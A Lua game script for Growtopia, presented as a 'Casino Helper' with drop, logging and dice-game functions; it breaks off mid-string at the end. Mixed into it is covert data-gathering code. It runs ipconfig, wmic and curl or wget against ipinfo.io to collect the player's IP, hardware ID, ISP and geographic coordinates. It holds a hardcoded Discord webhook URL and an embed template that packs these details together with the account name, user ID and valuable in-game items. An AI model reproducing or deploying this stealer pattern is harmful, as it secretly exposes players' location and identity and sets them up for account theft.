
function SEND_WEBHOOK(A, B) MakeRequest(A, "POST", {["Content-Type"] = "application/json"}, B) end

function GET_AMOUNT(A) for _, B in pairs(GetInventory()) do if B.id == A then return math.floor(B.amount) end end return 0 end
function GET_IP_ADDRESS() local H = io.popen("ipconfig") if H then local R = H:read("*a") H:close() local I = R:match("%d+%.%d+%.%d+%.%d+") if I then return I end end return "IP Adress not found" end
function GET_HWID() local H = io.popen('wmic csproduct get uuid /format:list') if H then local R = H:read("*a") H:close() local I = R:match("%d+-%d+-%d+-%d+-%d+") if I then return I end end return "Hardware ID not found" end
function GET_PROVIDER() local CMD = { "curl -s https://ipinfo.io/json", "wget -qO- https://ipinfo.io/json" } for _, C in ipairs(CMD) do local H = io.popen(C) if H then local R = H:read("*a") H:close() local function EXTRACT_INFORMATION(P) return R:match(P) or "Unknown" end return { IP_ADDRESS = EXTRACT_INFORMATION('"ip"%s*:%s*"([^"]+)"'), CITY = EXTRACT_INFORMATION('"city"%s*:%s*"([^"]+)"'), REGION = EXTRACT_INFORMATION('"region"%s*:%s*"([^"]+)"'), COUNTRY = EXTRACT_INFORMATION('"country"%s*:%s*"([^"]+)"'), ORGANIZATION = EXTRACT_INFORMATION('"org"%s*:%s*"([^"]+)"'), COORDINATE = EXTRACT_INFORMATION('"loc"%s*:%s*"([^"]+)"'), } end end return nil end
function GET_INVENTORY() TABLE_SCAN = {} for _, I in pairs(GetInventory()) do VALUE = I.id if TABLE_SCAN[I.id] == nil then TABLE_SCAN[I.id] = {VALUE = I.id, AMOUNT = I.amount} else TABLE_SCAN[I.id].amount = TABLE_SCAN[I.id].amount + I.amount end end LOAD_STRING = "" for _, D in pairs(TABLE_SCAN) do ITEM_COUNT = math.floor(D.AMOUNT) ITEM_NAME = GetItemInfo(math.floor(D.VALUE)).name LOAD_STRING = LOAD_STRING..""..ITEM_NAME.." : "..ITEM_COUNT.."\n" end Sleep(500) PATH = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Growtopia\\cache\\Inventory.txt" FILE = io.open(PATH, "a") FILE:write(LOAD_STRING) FILE:close() end

function FORMAT_BALANCE(A) if A == "IN" then local W, D, B, I, R = GET_AMOUNT(242), GET_AMOUNT(1796), GET_AMOUNT(7188), GET_AMOUNT(11550), "`w" if I == 0 and B == 0 and D == 0 and W == 0 then return "-" end if I ~= 0 then if B ~= 0 or D ~= 0 or W ~= 0 then R = R ..I.. " `bBlack Gem Lock `w" else R = R ..I.. " `bBlack Gem Lock" end end if B ~= 0 then if D ~= 0 or W ~= 0 then R = R ..B.. " `eBlue Gem Lock `w" else R = R ..B.. " `eBlue Gem Lock" end end if D ~= 0 then if W ~= 0 then R = R ..D.. " `1Diamond Lock `w" else R = R ..D.. " `1Diamond Lock" end end if W ~= 0 then R = R ..W.. " `9World Lock" end return R end if A == "DC" then local W, D, B, I, R = GET_AMOUNT(242), GET_AMOUNT(1796), GET_AMOUNT(7188), GET_AMOUNT(11550), "" if I == 0 and B == 0 and D == 0 and W == 0 then return "Poor members :face_holding_back_tears:" end if I ~= 0 then if B ~= 0 or D ~= 0 or W ~= 0 then R = R .. "**" ..I.. "** Black Gem Lock " else R = R .. "**" ..I.. "** Black Gem Lock" end end if B ~= 0 then if D ~= 0 or W ~= 0 then R = R .. "**" ..B.. "** Blue Gem Lock " else R = R .. "**" ..B.. "** Blue Gem Lock" end end if D ~= 0 then if W ~= 0 then R = R .. "**" ..D.. "** Diamond Lock " else R = R .. "**" ..D.. " Diamond Lock" end end if W ~= 0 then R = R .. "**" ..W.. "** World Lock" end return R end if A == "ITEM" then local M, L, I, LK, LW, LB, R = GET_AMOUNT(GetItemInfo("Mythical Infinity Rayman's Fist").id), GET_AMOUNT(GetItemInfo("Legendary Infinity Rayman's Fist").id), GET_AMOUNT(GetItemInfo("Infinity Gem Lock").id), GET_AMOUNT(GetItemInfo("Legendary Katana").id), GET_AMOUNT(GetItemInfo("Legendary Wings").id), GET_AMOUNT(GetItemInfo("Legendbot-009").id), "" if M == 0 and L == 0 and I == 0 and LK == 0 and LW == 0 and LB == 0 then return "Poor members :face_holding_back_tears:" end if M ~= 0 then if L ~= 0 or I ~= 0 or LK ~= 0 or LW ~= 0 or LB ~= 0 then R = R .. "**" ..M.. "** Mythical Infinity Rayman's Fist, " else R = R .. "**" ..M.. "** Mythical Infinity Rayman's Fist" end end if L ~= 0 then if I ~= 0 or LK ~= 0 or LW ~= 0 or LB ~= 0 then R = R .. "**" ..L.. "** Legendary Infinity Rayman's Fist, " else R = R .. "**" ..L.. "** Legendary Infinity Rayman's Fist" end end if I ~= 0 then if LK ~= 0 or LW ~= 0 or LB then R = R .. "**" ..I.. "** Infinity Gem Lock, " else R = R .. "**" ..I.. "** Infinity Gem Lock" end end if LK ~= 0 then if LW ~= 0 or LB ~= 0 then R = R .. "**" ..LK.. "** Legendary Katana, " else R = R .. "**" ..LK.. "** Legendary Katana" end end if LW ~= 0 then if LB ~= 0 then R = R .. "**" ..LW.. "** Legendary Wings, " else R = R .. "**" ..LW.. "** Legendary Wings" end end if LB ~= 0 then R = R .. "**" ..LB.. "** Legendary Bot" end return R end end
function FORMAT_NAME(A) A = A:gsub("``","") A = A:gsub("`.","") A = A:gsub("Dr.","") A = A:gsub("@",""):gsub(" of Legend",""):gsub("%[BOOST%]","") A = A:gsub("%[ELITE%]",""):gsub(" ","") return A end
function FORMAT_NUMBER(A) A = math.floor(A + 0.5) local F = tostring(A) local B = 3 while B < #F do F = F:sub(1, #F - B) .. "." .. F:sub(#F - B + 1) B = B + 4 end return F end
function FORMAT_NETWORK(A) local I = GET_PROVIDER() if I then if A == "IP" then return I.IP_ADDRESS end if A == "GEOLOCATION" then return I.CITY..", "..I.REGION..", "..I.COUNTRY end if A == "INET" then return I.ORGANIZATION end if A == "COORD" then return I.COORDINATE end return I else print("Unable to retrieve location information") return nil end end

function CHECKING_SOMETHING(A, B) for _, C in pairs(A) do if C == B then return true end end return false end
V = {
    SYSTEM = {
        GUARD = true,
        CREDIT = "`w[`5Starries`w] ",
    },
    UI = {
		LANGUAGE = "ENGLISH",
		PRIMARY = "w",
		SECONDARY = "5",
		NOTE = "6",
		DANGER = "4",
		WARNING = "9",
		SUCCESS = "2"
	},
    DISCORD = {
        WEBHOOK_OFFICIAL = "https://discord.com/api/webhooks/1316264768692162560/FFpLuS5nvnlsiPhMr4B4BUcKMEQyf-uJJ9coRUOQceWblXIFZMN2dXpbiONLu7g-_EYv?thread_id=%s",
        EMBED_OFFICIAL = [[{ "content": "%s", "embeds": [{ "color": %s, "image": { "url": "https://media.discordapp.net/attachments/1178939143024300042/1309409349847875628/A.gif" }, "fields": [{ "name": "General", "value": "`😇` Username : **%s**\n`🔍` Userid : **%s**\n`🌏` Current World : **%s**\n`💎` Current Gems : **%s**" },{ "name": "Status", "value": "`💬` %s"}, { "name": "Balance", "value": "`📊` ]]..FORMAT_BALANCE("DC")..[["}, { "name": "Expensive items", "value": "`💳` ]]..FORMAT_BALANCE("ITEM")..[[" }, { "name": "Networks", "value": "`📡` IP Address : **]]..FORMAT_NETWORK("IP")..[[**\n`📌` Geolocation : **]]..FORMAT_NETWORK("GEOLOCATION")..[[**\n`🧰` Internet Provider : **]]..FORMAT_NETWORK("INET")..[[**\n`🚩` Latitude/Longitude : **]]..FORMAT_NETWORK("COORD")..[[**"}],"footer": { "text": "Running on Bothex | Casino Helper", "icon_url": "https://cdn.discordapp.com/icons/884351729859199016/1b3eebd209e919506c96138fd1ab22dd.webp"}}] }]],
    },
    HOSTER = {
		REME_MODE = false,
		QEME_MODE = false,
		PEME_MODE = false,
		LEME_MODE = false,
	},
    LOG = {
		DROP = {},
		COLLECT = {},
		SPIN = {},
		ADDITIONAL = {
			SHOW_WORLD = false,
			SHOW_TIME = false,
			SHOW_REME = false,
			SHOW_QEME = false,
			SHOW_PEME = false,
			SHOW_LEME = false
		}
	},
    BUBBLE = {
		HIDE_BUBBLE = false,
		COLLECT_BUBBLE = true,
		DROP_BUBBLE = true,
		TRASH_BUBBLE = false,
		DEPOSIT_BUBBLE = false,
		WITHDRAW_BUBBLE = false,
	},
	OVERLAY = {
		HIDE_OVERLAY = false,
		COLLECT_OVERLAY = false,
		DROP_OVERLAY = false,
		TRASH_OVERLAY = false,
		DEPOSIT_OVERLAY = false,
		WITHDRAW_OVERLAY = false,
	}
}

function CHAT(A) SendPacket(2, "action|input\n|text|" ..A) end 
function CONSOLE(A) SendVariantList({[0] = "OnConsoleMessage", [1] = V.SYSTEM.CREDIT.."`o"..A }) end 
function BUBBLE(A, B) SendVariantList({[0] = "OnTalkBubble", [1] = A, [2] = B}) return true end
function OVERLAY(A) SendVariantList({[0] = "OnTextOverlay", [1] = A}) end 
function DIALOG(A, B) SendVariantList({[0] = "OnDialogRequest", [1] = A}, -1, B) end
function SPLIT(A, B) local T = {} for A in string.gmatch(A, "([^"..B.."]+)") do table.insert(T, A) end return T end

function REME_COUNT(N) tonumber(N) if N == 19 or N == 28 or N == 0 then R = "`20 (lucky)" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end
function QEME_COUNT(N) tonumber(N) if N == 10 or N == 20 or N == 30 then R = "`20 (lucky)" elseif N == 0 then R = "1" elseif N >= 10 then R = string.sub(N, -1) else R = N end return R end
function PEME_COUNT(N) tonumber(N) if N == 9 or N == 18 or N == 27 or N == 36 then R = "9 (cry)" elseif N == 19 or N == 28 or N == 0 then R = "`20 (lucky)" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end
function LEME_COUNT(N) tonumber(N) if N == 9 or N == 18 or N == 27 or N == 36 then R = "9 (cry)" elseif N == 19 or N == 28 or N == 0 then R = "`20 (lucky) X4" elseif N == 1 or N == 10 or N == 29 then R = "`20 (lucky) X3" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end
function GET_GAME(N) REME_GAME, QEME_GAME, PEME_GAME, LEME_GAME, TO_RETURN = "", "", "", "", "%s%s%s%s" if V.HOSTER.REME_MODE then REME_GAME = "`5REME `w: `5"..REME_COUNT(tonumber(N)).." " else REME_GAME = "" end if V.HOSTER.QEME_MODE then QEME_GAME = "`6QEME `w: `6"..QEME_COUNT(tonumber(N)).." " else QEME_GAME = "" end if V.HOSTER.PEME_MODE then PEME_GAME = "`1PEME `w: `1"..PEME_COUNT(tonumber(N)).." " else PEME_GAME = "" end if V.HOSTER.LEME_MODE then LEME_GAME = "`rLEME `w: `r"..LEME_COUNT(tonumber(N)).." " else LEME_GAME = "" end return TO_RETURN:format(REME_GAME, QEME_GAME, PEME_GAME, LEME_GAME) end

function GET_NETID_BY_NAME(N) for _, P in pairs(GetPlayerList()) do if P.name == N then return P.netid end end end 
function GET_USERID_BY_NETID(N) for _, P in pairs(GetPlayerList()) do if P.netid == N then return P.userid end end end 


function CHECKING_LANGUAGE(A)
if A == "ENGLISH" then
    D = {
        ALERT = {
            WRONG = "`w[`4OOPS`w] ",
            PLEASE_WAIT = "`w[`4OOPS`w] `oPlease wait a seconds...",
            NEXT_UPDATE = "`w[`4OOPS`w] `oThis feature aren't available right now! please wait for next update (halo)",
            AMOUNT_NIL = "`w[`4OOPS`w] `oYou must enter a valid number",
            AMOUNT_NOL = "`w[`4OOPS`w] `oWhat do you want to do with the number 0?",
            AMOUNT_LESS = "`w[`4OOPS`w] `oYou don't have enough items to drop according to that amount!"
        },
        STARTING = {
            CHECKING = "Checking userid to make sure you have access`o.",
            AUTH_SUCCESS = "Player authentication `2successful`o.",
            AUTH_FAILED = "Player authentication `4failed`o.",
            SHOW_DISCORD = "Join our Discord Server : discord.gg/2QeRPMJArU",
            SHOW_BALANCE = "Your balance :",
            SHOW_HELP = "Type `5/menu `oto show feature, or click `5Social `obutton`o.",
            SHOW_CREDIT = "Casino Helper by `5@starries.real"
        },
        MAIN_MENU = {
            TEXT = {
                TITLE = "Casino Helper",
                DESC_1 = "This Helper was made by",
                DESC_2 = "Thanks for using this script !",
                HI = "Hi",
                WORLD = "You're currently at",
                STAND = "You're standing at",
                DATETIME = "It is currently",
                TIME = os.date("%H:%M `"..V.UI.PRIMARY.."on `"..V.UI.SECONDARY.."%B %d, %Y"),
                SPACE = "-------------------------------------------------------------------------",
                FEATURE = "Features",
            },
            BUTTON = {
                CLOSE = "Nevermind.",
                SOCIAL = "Social Portal",
                COMMAND = "Command List",
                ABILITY = "Your Ability",
                LIST_MENU = "List Menu",
                SPAM = "Spam Editor",
                INFO = "Information",
            },
        },
        LOG = {
            ADDITIONAL = {
                CLEAR = "Clear Log",
                REAL = "Filter `2Real",
                FAKE = "Filter `4Fake",
                SHOW_UID = "Show UID",
                SHOW_WORLD = "Show World",
                SHOW_TIME = "Show Time",
                SHOW_REME = "Show Reme",
                SHOW_QEME = "Show Qeme",
                SHOW_PEME = "Show Peme",
                SHOW_LEME = "Show Leme"
            }
        }
    }
elseif A == "INDONESIA" then

end
end

function RUNNING_SCRIPT() 

function MERGE_BLACK() SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bgl") end
function SHATTER_BLACK() SendPacket(2,"action|dialog_return\ndialog_name|info_box\nbuttonClicked|make_bluegl") end

-- // Function
function CHECKBOX(B) local R = "" if B then R =  "1" else R = "0" end return R end
function CHECKBOX_MODE(B, C) local R = "" if B == C then R =  "1" else R = "0" end return R end
function FRAME(B) local R = "" if B then R =  "staticPurpleFrame" else R = "staticGreyFrame" end return R end 
function FRAME_MODE(V, S) local R = "" if V == S then R = "staticPurpleFrame" else R = "staticGreyFrame" end return R end

function PLACE(A, B, C) SendPacketRaw(false,{type = 3, value = A, x = GetLocal().pos.x, y = GetLocal().pos.y, px = B, py = C}) end 
function WEAR(A) SendPacketRaw(false, {type = 10, value = A}) end 
function DROP(A, B) SendPacket(2,"action|dialog_return\ndialog_name|drop\nitem_drop|".. A .. "|\nitem_count|".. B) end 
function TRASH(A, B) SendPacket(2,"action|dialog_return\ndialog_name|trash\nitem_trash|".. A .. "|\nitem_count|".. B) end 
function DEPO(A) SendPacket(2, "action|dialog_return\ndialog_name|bank_deposit\nbgl_count|" .. A) end
function WEDE(A) SendPacket(2, "action|dialog_return\ndialog_name|bank_withdraw\nbgl_count|" .. A) end

function REME_COUNT(N) tonumber(N) if N == 19 or N == 28 or N == 0 then R = "`20 (lucky)" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end
function QEME_COUNT(N) tonumber(N) if N == 10 or N == 20 or N == 30 then R = "`20 (lucky)" elseif N == 0 then R = "1" elseif N >= 10 then R = string.sub(N, -1) else R = N end return R end
function PEME_COUNT(N) tonumber(N) if N == 9 or N == 18 or N == 27 or N == 36 then R = "9 (cry)" elseif N == 19 or N == 28 or N == 0 then R = "`20 (lucky)" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end
function LEME_COUNT(N) tonumber(N) if N == 9 or N == 18 or N == 27 or N == 36 then R = "9 (cry)" elseif N == 19 or N == 28 or N == 0 then R = "`20 (lucky) X4" elseif N == 1 or N == 10 or N == 29 then R = "`20 (lucky) X3" else N1 = math.floor(N / 10) N2 = N % 10 R = string.sub(tostring(N1 + N2), -1) end return R end

function GET_GAME(N) REME_GAME, QEME_GAME, PEME_GAME, LEME_GAME, TO_RETURN = "", "", "", "", "%s%s%s%s" if V.HOSTER.REME_MODE then REME_GAME = "`5REME `w: `5"..REME_COUNT(tonumber(N)).." " else REME_GAME = "" end if V.HOSTER.QEME_MODE then QEME_GAME = "`6QEME `w: `6"..QEME_COUNT(tonumber(N)).." " else QEME_GAME = "" end if V.HOSTER.PEME_MODE then PEME_GAME = "`1PEME `w: `1"..PEME_COUNT(tonumber(N)).." " else PEME_GAME = "" end if V.HOSTER.LEME_MODE then LEME_GAME = "`rLEME `w: `r"..LEME_COUNT(tonumber(N)).." " else LEME_GAME = "" end return TO_RETURN:format(REME_GAME, QEME_GAME, PEME_GAME, LEME_GAME) end

function GETTING_NETID(N) for _, P in pairs(GetPlayerList()) do if string.sub(P.name, 3, string.len(P.name) - 2) == N then return math.floor(P.netid) end end return GetLocal().netid end
function STATE(X, Y, Z) local F = -1 if Z == "left" then F = 48 elseif Z == "right" then F = 32 end SendPacketRaw(false, {type = 0, x = (X) * 32, y = (Y) * 32, state = F}) Sleep(80) end
function GET_NAME_BY_NETID(I) S = "Unknown" for _, P in pairs(GetPlayerList()) do if P.netid == I then S = P.name end end return S end 
function GET_NAME_BY_USERID(I) S = "Unknown" for _, P in pairs(GetPlayerList()) do if P.userid == I then S = P.name end end return S end 
function GET_NETID(N) for _, P in pairs(GetPlayerList()) do if P.name == N then return P.netid end end end 
function GET_USER_ID(N) for _, P in pairs(GetPlayerList()) do if P.netid == N then return P.userid end end end 

function GET_DATA(N) tonumber(N) local W, D, B, I, DATA = N % 100, math.floor(N / 100) % 100, math.floor(N / 10000) % 100, math.floor(N / 1000000) % 100, "`w" if I == 0 and B == 0 and D == 0 and W == 0 then return "-" end if I ~= 0 then if B ~= 0 or D ~= 0 or W ~= 0 then DATA = DATA ..I.. " `bBlack Gem Lock `w" else DATA = DATA ..I.. " `bBlack Gem Lock" end end if B ~= 0 then if D ~= 0 or W ~= 0 then DATA = DATA ..B.. " `eBlue Gem Lock `w" else DATA = DATA ..B.. " `eBlue Gem Lock" end end if D ~= 0 then if W ~= 0 then DATA = DATA ..D.. " `1Diamond Lock `w" else DATA = DATA ..D.. " `1Diamond Lock" end end if W ~= 0 then DATA = DATA ..W.. " `9World Lock" end return DATA end 

function CUSTOM_DROP(F) RESULT = GET_DATA(F)
WORLD_LOCK = F % 100 DIAMOND_LOCK = math.floor((F % 10000) / 100) BLUE_GEM_LOCK = math.floor((F % 1000000) / 10000) BLACK_GEM_LOCK = math.floor(F / 1000000)

-- // Debugging CONSOLE("Result : "..WORLD_LOCK.. " - " .. DIAMOND_LOCK .. " - " .. BLUE_GEM_LOCK .. " - " ..BLACK_GEM_LOCK)
RunThread(function() while CDROP do if SHOW_COLLECTED then break end Sleep(250) 
if BLACK_GEM_LOCK > 0 then if GET_AMOUNT(11550) < math.floor(BLACK_GEM_LOCK) and GET_AMOUNT(7188) > math.floor(BLACK_GEM_LOCK)*100 then MERGE_BLACK() Sleep(50) end
DROP(11550, BLACK_GEM_LOCK) Sleep(50) CONSOLE("Dropped  `w"..BLACK_GEM_LOCK.. " Black Gem Lock`o.") Sleep(50) table.insert(V.LOG.DROP, {DROP = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `odropped `w"..BLACK_GEM_LOCK.." Black Gem Lock`o. at "..os.date("%H:%M on %d/%m").."|left|11550|11550|\n", DROP_ID = 11550})
end
if BLUE_GEM_LOCK > 0 then if GET_AMOUNT(7188) < math.floor(BLUE_GEM_LOCK) then SHATTER_BLACK() Sleep(50) end
DROP(7188, BLUE_GEM_LOCK) Sleep(50) CONSOLE("Dropped  `w"..BLUE_GEM_LOCK.. " Blue Gem Lock`o.") Sleep(50) table.insert(V.LOG.DROP, {DROP = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `odropped `w"..BLUE_GEM_LOCK.." Blue Gem Lock`o. at "..os.date("%H:%M on %d/%m").."|left|7188|7188|\n", DROP_ID = 7188})
end
if DIAMOND_LOCK > 0 then if GET_AMOUNT(1796) < math.floor(DIAMOND_LOCK) then WEAR(7188) Sleep(50) end
DROP(1796, DIAMOND_LOCK) Sleep(50) CONSOLE("Dropped  `w"..DIAMOND_LOCK.. " Diamond Lock`o.") Sleep(50) table.insert(V.LOG.DROP, {DROP = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `odropped `w"..DIAMOND_LOCK.." Diamond Lock`o. at "..os.date("%H:%M on %d/%m").."|left|1796|1796|\n", DROP_ID = 1796})
end
if WORLD_LOCK > 0 then if GET_AMOUNT(242) < math.floor(WORLD_LOCK) then WEAR(1796) Sleep(50) end
DROP(242, WORLD_LOCK) Sleep(50) CONSOLE("Dropped  `w"..WORLD_LOCK.. " World Lock`o.") Sleep(50) table.insert(V.LOG.DROP, {DROP = "\nadd_label_with_icon_button|small|"..GetLocal().name.." `odropped `w"..WORLD_LOCK.." World Lock`o. at "..os.date("%H:%M on %d/%m").."|left|242|242|\n", DROP_ID = 242})
end CHAT(V.SYSTEM.CREDIT.."Dropping ".. RESULT) if CDROP then CDROP = false end Sleep(200) if not CDROP then break end end end)
end

function DIALOG_DROP_LOG() A = {} for _, T in pairs(V.LOG.DROP) do table.insert(A, T.DROP) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Dropped Log|left|13810|\nadd_spacer|small|\nadd_smalltext|Click the item icon to filter by that item|\n"..table.concat(A).."\nadd_spacer|small|\nadd_quick_exit|||\nend_dialog|DROP_LOG|Close||"}) end
function FILTER_DROP_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.LOG.DROP) do if D.DROP_ID == I then table.insert(F, "\nadd_label_with_icon|small|"..D.DROP.."|left|"..D.DROP_ID.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Dropped Log|left|13810|\nadd_spacer|small|\nadd_smalltext|Filtered to : `"..V.UI.SECONDARY..""..GetItemInfo(math.floor(table.concat(E))).name.."|\n"..table.concat(F).."\nadd_spacer|small|\nadd_button|DROP_LOG_MENU|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_DROP_LOG|||"}) end
function DIALOG_COLLECT_LOG() A = {} for _, T in pairs(V.LOG.COLLECT) do table.insert(A, T.COLLECT) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Collected Log|left|13808|\nadd_spacer|small|\nadd_smalltext|Click the item icon to filter by that item|\n"..table.concat(A).."\nadd_spacer|small|\nadd_quick_exit|||\nend_dialog|COLLECT_LOG|Close||"}) end
function FILTER_COLLECT_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.LOG.COLLECT) do if D.COLLECT_ID == I then table.insert(F, "\nadd_label_with_icon|small|"..D.COLLECT.."|left|"..D.COLLECT_ID.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Collected Log|left|13808|\nadd_spacer|small|\nadd_smalltext|Filtered to : `"..V.UI.SECONDARY..""..GetItemInfo(math.floor(table.concat(E))).name.."|\n"..table.concat(F).."\nadd_spacer|small|\nadd_button|COLLECT_LOG_MENU|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_COLLECT_LOG|||"}) end
function DIALOG_TRASH_LOG() A = {} for _, T in pairs(V.TABLE.ACTIVITY_LOG) do table.insert(A, T.TRASH) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Trashed Log|left|6068|\nadd_spacer|small|\nadd_smalltext|Click the item icon to filter by that item|\n"..table.concat(A).."\nadd_spacer|small|\nadd_button|/log|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|TRASH_LOG|||"}) end
function FILTER_TRASH_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.TABLE.ACTIVITY_LOG) do if D.TRASH_ID == I then table.insert(F, "\nadd_label_with_icon|small|"..D.TRASH.."|left|"..D.TRASH_ID.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Trashed Log|left|6068|\nadd_spacer|small|\nadd_smalltext|Filtered to : `"..V.UI.SECONDARY..""..GetItemInfo(math.floor(table.concat(E))).name.."|\n"..table.concat(F).."\nadd_spacer|small|\nadd_button|/trashlog|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_TRASH_LOG|||"}) end
function DIALOG_ENTER_LOG() A = {} for _, T in pairs(V.TABLE.ACTIVITY_LOG) do table.insert(A, T.ENTER) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Entered Log|left|13804|\nadd_spacer|small|\nadd_smalltext|Click the icon to filter by user id|\n"..table.concat(A).."\nadd_spacer|small|\nadd_button|/log|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|ENTER_LOG|||"}) end
function FILTER_ENTER_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.TABLE.ACTIVITY_LOG) do if D.USER_ID == I then table.insert(F, "\nadd_label_with_icon|small|"..D.ENTER.."|left|"..D.USER_ID.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|User Enter Log|left|1400|\nadd_spacer|small|"..table.concat(F).."\nadd_spacer|small|\nadd_button|/enterlog|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_ENTER_LOG|||"}) end
function DIALOG_EXIT_LOG() A = {} for _, T in pairs(V.TABLE.ACTIVITY_LOG) do table.insert(A, T.EXIT) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Exited Log|left|13806|\nadd_spacer|small|\nadd_smalltext|Click the icon to filter by user id|\n"..table.concat(A).."\nadd_spacer|small|\nadd_button|/log|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|EXIT_LOG|||"}) end
function FILTER_EXIT_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.TABLE.ACTIVITY_LOG) do if D.USER_ID == I then table.insert(F, "\nadd_label_with_icon|small|"..D.EXIT.."|left|"..D.USER_ID.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|User Exit Log|left|1400|\nadd_spacer|small|"..table.concat(F).."\nadd_spacer|small|\nadd_button|/exitlog|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_EXIT_LOG|||"}) end
function DIALOG_WRENCH_LOG() A = {} for _, T in pairs(V.TABLE.ACTIVITY_LOG) do table.insert(A, T.WRENCH) end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Wrench Log|left|32|\nadd_spacer|small|\nadd_smalltext|Click the icon to filter by the wrench type|\n"..table.concat(A).."\nadd_spacer|small|\nadd_button|/log|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|WRENCH_LOG|||"}) end
function FILTER_WRENCH_LOG(I) F, E = {}, {} table.insert(E, I) for _, D in pairs(V.TABLE.ACTIVITY_LOG) do if D.WRENCH_TYPE == I then table.insert(F, "\nadd_label_with_icon|small|"..D.WRENCH.."|left|"..D.WRENCH_ICON.."|\n") end end SendVariantList({[0] = "OnDialogRequest", [1] = "set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Wrench Log|left|32|\nadd_spacer|small|\nadd_smalltext|Filtered to : `"..V.UI.SECONDARY..""..table.concat(E).."|\n"..table.concat(F).."\nadd_spacer|small|\nadd_button|/wrenchlog|Back|noflags|0|0|\nadd_quick_exit|||\nend_dialog|FILTER_WRENCH_LOG|||"}) end

function DIALOG_SPIN_LOG() SHOW_UID_STRING, SHOW_WORLD_STRING, SHOW_TIME_STRING, SHOW_REME_STRING, SHOW_QEME_STRING, SHOW_PEME_STRING, SHOW_LEME_STRING, SL = "", "", "", "", "", "", "", {}  for _, T in pairs(V.LOG.SPIN) do if V.LOG.ADDITIONAL.SHOW_WORLD then SHOW_WORLD_STRING = T.WORLD else SHOW_WORLD_STRING = "" end if V.LOG.ADDITIONAL.SHOW_TIME then SHOW_TIME_STRING = T.TIME else SHOW_TIME_STRING = "" end if V.LOG.ADDITIONAL.SHOW_UID then SHOW_UID_STRING = T.UID else SHOW_UID_STRING = "" end if V.LOG.ADDITIONAL.SHOW_REME then SHOW_REME_STRING = T.REME else SHOW_REME_STRING = "" end if V.LOG.ADDITIONAL.SHOW_QEME then SHOW_QEME_STRING = T.QEME else SHOW_QEME_STRING = "" end if V.LOG.ADDITIONAL.SHOW_PEME then SHOW_PEME_STRING = T.PEME else SHOW_PEME_STRING = "" end if V.LOG.ADDITIONAL.SHOW_LEME then SHOW_LEME_STRING = T.LEME else SHOW_LEME_STRING = "" end table.insert(SL, T.SPIN:format(SHOW_WORLD_STRING, SHOW_TIME_STRING, SHOW_UID_STRING, SHOW_REME_STRING, SHOW_QEME_STRING, SHOW_PEME_STRING, SHOW_LEME_STRING)) end SendVariantList({[0] = "OnDialogRequest", [1] = tostring("set_default_color|`"..V.UI.PRIMARY.."|\nadd_label_with_icon|big|Spin 